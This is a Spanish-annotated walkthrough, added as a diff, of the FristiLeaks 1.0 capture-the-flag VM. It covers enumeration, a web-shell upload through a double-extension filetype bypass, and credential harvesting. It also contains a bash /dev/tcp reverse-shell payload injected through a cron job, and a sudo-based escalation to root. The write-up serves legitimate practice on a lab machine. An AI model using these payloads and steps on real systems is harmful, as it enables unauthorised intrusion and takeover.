@@ -1,0 +1,192 @@
+###################################################################################################################################################################################################################
+[ 1 ] ENUMERATION
+
+// OS & services
+80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
+
+// Directory Fuzzing
+dirb http://192.168.1.17 /usr/share/wordlists/dirb/big.txt
+/beer/
+/images/
+
+// Directory Fuzzing
+wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt --hc 404 http://192.168.1.17/FUZZ
+/images
+
+// Nikto
+/cola
+/sisi =fanta
+/beer
+http://192.168.1.17/icons/
+
+!!!!!
+// De la imagen del index deducimos que todo son bebidas
+// debemos beber friski...
+http://192.168.1.17/fristi
+// De un commentario del código fuente de login
+// user eezeepz
+<!-- 
+TODO:
+We need to clean this up for production. I left some junk in here to make testing easier.
+
+- by eezeepz
+-->
+
+
+###################################################################################################################################################################################################################
+[ 2 ] EXPLOTATION
+
+!!!!!
+// De ese mismo código fuente
+// Arreglamos la imagen y tenemos la contraseña
+// pass=keKkeKKeKKeKkEkkEk
+
+<img src="data:img/png;base64,iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
+jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl
+S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw
+B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f
+m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ
+Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb
+DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd
+jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU
+12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5
+uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1
+04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq
+i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg
+tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws
+30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl
+3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK
+ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q
+mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34
+rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe
+EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH
+AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk
+CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR
+U5ErkJggg==">cd
+
+// Aqui subo una webshell
+// Modifico el nombre a shell.php.jpg
+// Capturo tráfico con zap y modifico el filetype
+
+// Lanzo comandos con la webshell pero no tiene netcat
+// Descargo esta shell con wget
+http://pentestmonkey.net/tools/web-shells/php-reverse-shell
+// Descomprimo, muevo el fichero, doy permisos, hago cambios con sed XD
+
+// Tengo una shell normal de un usuario sin privilegios
+// Saco más información
+cat checklogin.php
+ob_start();
+$host="localhost"; // Host name
+$username="eezeepz"; // Mysql username
+$password="4ll3maal12#"; // Mysql password
+$db_name="hackmenow"; // Database name
+$tbl_name="members"; // Table name
+----
++----+----------+--------------------+
+| id | username | password           |
++----+----------+--------------------+
+|  1 | eezeepz  | keKkeKKeKKeKkEkkEk |
++----+----------+--------------------+
+
+
+###################################################################################################################################################################################################################
+[ 3 ] PRIVILEGE ESCALATION
+
+// Shell interactiva
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+// Encuentro un fichero que da pistas sobre como hacer la primera elevación de privilegios
+cat notes.txt
+Yo EZ,
+
+I made it possible for you to do some automated checks, 
+but I did only allow you access to /usr/bin/* system binaries. I did
+however copy a few extra often needed commands to my 
+homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
+from /home/admin/
+
+Don't forget to specify the full path for each binary!
+
+Just put a file called "runthis" in /tmp/, each line one command. The 
+output goes to the file "cronresult" in /tmp/. It should 
+run every minute with my account privileges.
+
+- Jerry
+
+// Voy a tmp y preparo el payload
+// La idea es lanzar un netcat desde el otro usuario admin para conseguir una nueva shell con ese usuario
+//PAYLOAD
+bash -i>&/dev/tcp/192.168.1.8/6969 0>&1
+echo "/usr/bin/whoami; bash -i>&/dev/tcp/192.168.1.8/6969 0>&1" > runthis
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+// Ahora ya somos admin
+
+// Shell interactiva
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+// Encuentro otro script, esta vez en python
+cat cryptpass.py
+    base64string= base64.b64encode(str)
+    return codecs.encode(base64string[::-1], 'rot13')
+
+cat cryptedpass.txt
+mVGZ3O3omkJLmy2pcuTq
+
+cat whoisyourgodnow.txt
+=RFn0AKnlMHMPIzpyuTI0ITG
+
+// Pillo un decoder en python
+// que haga el paso inverso
+[revil@lockpicker FristiLeaks]$ cat Decoder.py 
+import base64,codecs,sys
+
+ciphertext= '=RFn0AKnlMHMPIzpyuTI0ITG'
+
+decoded_codecs = codecs.encode(ciphertext[::-1], 'rot13')
+plaintext = base64.b64decode(decoded_codecs)
+
+print (plaintext)
+
+// Pass de fristigod
+pass=LetThereBeFristi!
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+// Aun no somos root
+
+// Hay una carpeta con ficheros ocultos en
+/var/fristigod
+bash-4.1$ ls -la
+ls -la
+total 16
+drwxr-x---   3 fristigod fristigod 4096 Nov 25  2015 .
+drwxr-xr-x. 19 root      root      4096 Nov 19  2015 ..
+-rw-------   1 fristigod fristigod  864 Nov 25  2015 .bash_history
+drwxrwxr-x.  2 fristigod fristigod 4096 Nov 25  2015 .secret_admin_stuff
+
+bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash
+bash-4.1# id
+id
+uid=0(root) gid=100(users) groups=100(users),502(fristigod)
+
+
+###################################################################################################################################################################################################################
+[ + ] INFORMATION
+
+bash-4.1# cat fristileaks_secrets.txt
+cat fristileaks_secrets.txt
+Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]
+
+I wonder if you beat it in the maximum 4 hours it's supposed to take!
+
+Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)
+
+
+Flag: Y0u_kn0w_y0u_l0ve_fr1st1
+
+
+###################################################################################################################################################################################################################
